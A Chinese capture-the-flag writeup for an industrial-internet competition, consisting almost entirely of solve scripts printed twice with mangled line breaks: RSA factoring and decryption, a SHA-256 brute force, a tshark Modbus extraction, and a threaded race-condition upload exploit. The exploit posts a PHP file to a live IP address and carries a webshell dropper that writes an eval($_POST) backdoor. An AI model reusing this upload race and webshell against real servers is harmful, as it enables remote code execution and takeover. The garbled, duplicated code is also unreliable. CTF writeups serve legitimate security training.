# 中国工业互联网江苏省选拔赛writeup

> 原文: https://www.ctfiot.com/73808.html
> ID: 73808

n = 8024564127973065791822696697071284794358778113244860389864422981119578975964727093926084927413648922361071020470150564725270618683354904686430544864634986421802250691574811643940493852040303365259871961829230451567976055242366978177493279020860227537560077272183489280971600541432160542487797473494437897108965642412346313867328843027097895335304551681879362719382890575460873246457441445622915378590294513103181807760404215667759122312502771211145132870220086702449210205047154398173087109995899654560082761774761002029827487645976212945576324039049642609852040160573026630219823125371936206527188545760503303196887c = 3180315760809674805307952038308070668830050176909147638772126511895314499221741418872541998973065111255595861696385202759844093540441475048944982758690063571599282883876643362851380191511250087221840725807404705385725070244402516934527422750911874245857588078974219707033577370635383250007806947507795729667764154840835200953651638272748044402141790503341924861185059671075139783417203879567804845438302056071839026625956697647771368487584705007737854745577029320506832583174617443045018932772363892102614493216452482474734088789707913499300956365998233734355238725491161615031776255737012637741880932940505976334292
from gmpy2 import iroot,invertfrom Crypto.Util.number import *
def quadratic(a,b,c): try: (d,t) = iroot(b*b - (4*a*c),2) if not t: return 0 return ((-b-d)//(2*a),(-b+d)//(2*a)) 
except: return 0
for I in range(10,2050): p_try = quadratic(1,-(2**I + 31336),n) if p_
try: print('nbit=,I') p = p_try[1] break
q = n//passert(isPrime(int(q)))assert(isPrime(int(p)))assert(n == p*q)print('p=',int(p))print('q=',int(q))for e in [int('1'*I,2) for I in range(1,50000)]: phi = (p-1)*(q-1) g = GCD(e,phi) if g == 1:
continue print('trying with e bits:',e.bit_length(),'gcd=',g) d = inverse(e//g,phi) m = pow(c,d,n) m,t = iroot(m,g) if not t:
continue flag = long_to_bytes(m) if b'flag' in flag: print(flag)        exit(0)

import hashlib
num = '86139'
ha = '2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108'num1 = '0123456789'for i in num1: for ii in num1: for iii in num1: for iiii in num1: for iiiii in num1: for iiiiii in num1: for iiiiiii in num1: for iiiiiiii in num1: num2 = num + i + ii + iii + iiii + iiiii + iiiiii + iiiiiii + iiiiiiii hash1 = hashlib.sha256(num2.encode()).hexdigest() if hash1 == ha: print(num2) break

tshark -r 1667353056652.pcapng -T fields -e modbus.data -Y "ip.src == 192.168.111.138 && modbus.func_code == 6" >> fuck.txt

import requests
from urllib3 import encode_multipart_formdataimport threading
data = {'file': ('1.php', open('D:\phpstudy_pro\WWW\python有用脚本\1.php', 'rb').read(), 'image/jpeg')}encode_data = encode_multipart_formdata(data)
data = encode_data[0]
def a(): t1 = requests.post('http://222.186.10.28:
15668/upload.php', headers={ 'Content-Type': encode_data[1] }, data=data )def b(): t2 = requests.get("http://222.186.10.28:
15668/upload/1.php") print(t2.status_code)
while 1: t = threading.Thread(target=a, args='') t.start() t1 = threading.Thread(target=b, args='')t1.start()

//木马<?php fputs(fopen('a.php', 'w'), '<?php @eval($_POST[1])?>');?>


```
n = 8024564127973065791822696697071284794358778113244860389864422981119578975964727093926084927413648922361071020470150564725270618683354904686430544864634986421802250691574811643940493852040303365259871961829230451567976055242366978177493279020860227537560077272183489280971600541432160542487797473494437897108965642412346313867328843027097895335304551681879362719382890575460873246457441445622915378590294513103181807760404215667759122312502771211145132870220086702449210205047154398173087109995899654560082761774761002029827487645976212945576324039049642609852040160573026630219823125371936206527188545760503303196887c = 3180315760809674805307952038308070668830050176909147638772126511895314499221741418872541998973065111255595861696385202759844093540441475048944982758690063571599282883876643362851380191511250087221840725807404705385725070244402516934527422750911874245857588078974219707033577370635383250007806947507795729667764154840835200953651638272748044402141790503341924861185059671075139783417203879567804845438302056071839026625956697647771368487584705007737854745577029320506832583174617443045018932772363892102614493216452482474734088789707913499300956365998233734355238725491161615031776255737012637741880932940505976334292
from gmpy2 import iroot,invertfrom Crypto.Util.number import *
def quadratic(a,b,c): try: (d,t) = iroot(b*b - (4*a*c),2) if not t: return 0 return ((-b-d)//(2*a),(-b+d)//(2*a)) 
except: return 0
for I in range(10,2050): p_try = quadratic(1,-(2**I + 31336),n) if p_
try: print('nbit=,I') p = p_try[1] break
q = n//passert(isPrime(int(q)))assert(isPrime(int(p)))assert(n == p*q)print('p=',int(p))print('q=',int(q))for e in [int('1'*I,2) for I in range(1,50000)]: phi = (p-1)*(q-1) g = GCD(e,phi) if g == 1:
continue print('trying with e bits:',e.bit_length(),'gcd=',g) d = inverse(e//g,phi) m = pow(c,d,n) m,t = iroot(m,g) if not t:
continue flag = long_to_bytes(m) if b'flag' in flag: print(flag)        exit(0)
import hashlib
num = '86139'
ha = '2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108'num1 = '0123456789'for i in num1: for ii in num1: for iii in num1: for iiii in num1: for iiiii in num1: for iiiiii in num1: for iiiiiii in num1: for iiiiiiii in num1: num2 = num + i + ii + iii + iiii + iiiii + iiiiii + iiiiiii + iiiiiiii hash1 = hashlib.sha256(num2.encode()).hexdigest() if hash1 == ha: print(num2) break
tshark -r 1667353056652.pcapng -T fields -e modbus.data -Y "ip.src == 192.168.111.138 && modbus.func_code == 6" >> fuck.txt
import requests
from urllib3 import encode_multipart_formdataimport threading
data = {'file': ('1.php', open('D:\phpstudy_pro\WWW\python有用脚本\1.php', 'rb').read(), 'image/jpeg')}encode_data = encode_multipart_formdata(data)
data = encode_data[0]
def a(): t1 = requests.post('http://222.186.10.28:
15668/upload.php', headers={ 'Content-Type': encode_data[1] }, data=data )def b(): t2 = requests.get("http://222.186.10.28:
15668/upload/1.php") print(t2.status_code)
while 1: t = threading.Thread(target=a, args='') t.start() t1 = threading.Thread(target=b, args='')t1.start()
//木马<?php fputs(fopen('a.php', 'w'), '<?php @eval($_POST[1])?>');?>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668393450.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1668393451.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1668393452.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1668393453.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668393455.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1668393456.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668393458.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668393460.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1668393461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1668393461.png)